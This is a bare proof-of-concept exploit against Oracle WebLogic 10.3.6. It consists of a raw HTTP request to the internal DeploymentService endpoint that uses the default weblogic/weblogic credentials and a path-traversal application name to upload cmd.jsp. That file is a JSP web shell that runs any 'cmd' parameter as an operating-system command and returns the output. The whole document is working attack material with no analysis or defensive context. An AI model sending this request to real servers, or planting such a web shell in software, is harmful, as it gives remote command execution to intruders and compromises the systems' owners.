### PoC

```
POST /bea_wls_deployment_internal/DeploymentService HTTP/1.1
Host:  127.0.0.1:7001
User-Agent: Mozilla/5.0 (X11; Ubuntu; Linux i686; rv:20.0) Gecko/20100101 Firefox/20.0
Accept: text/html, image/gif, image/jpeg, */*; q=.2
Connection: keep-alive
username: weblogic
password: weblogic
wl_request_type: app_upload
wl_upload_application_name: \\..\\tmp\\_WL_internal\\bea_wls_internal\\9j4dqk\\war
wl_upload_delta: true
archive: true
serverName: pyn3rd
server_version: 10.3.6.0
Content-Type: multipart/form-data; boundary=---------------------------55365303813990412251182616919
Content-Length: 982

-----------------------------55365303813990412251182616919
Content-Disposition: form-data; name="img"; filename="cmd.jsp"
Content-Type: application/octet-stream

<%@ page import="java.util.*,java.io.*"%>
<%
%>
<html>
<body>
<form  method="GET" name="myform" action="">
<input type="text"  name="cmd">
<input type="submit" value="send">
</form>
<pre>
<%
if (request.getParameter("cmd") != null) {
        out.println("Command: " + request.getParameter("cmd") + "<br>");
        Process p = Runtime.getRuntime().exec(request.getParameter("cmd"));
        OutputStream os = p.getOutputStream();
        InputStream in = p.getInputStream();
        DataInputStream dis = new DataInputStream(in);
        String disr = dis.readLine();
        while ( disr != null ) {
                out.println(disr);
                disr = dis.readLine();
                }
        }
%>
</pre>
</body>
</html>
-----------------------------55365303813990412251182616919--
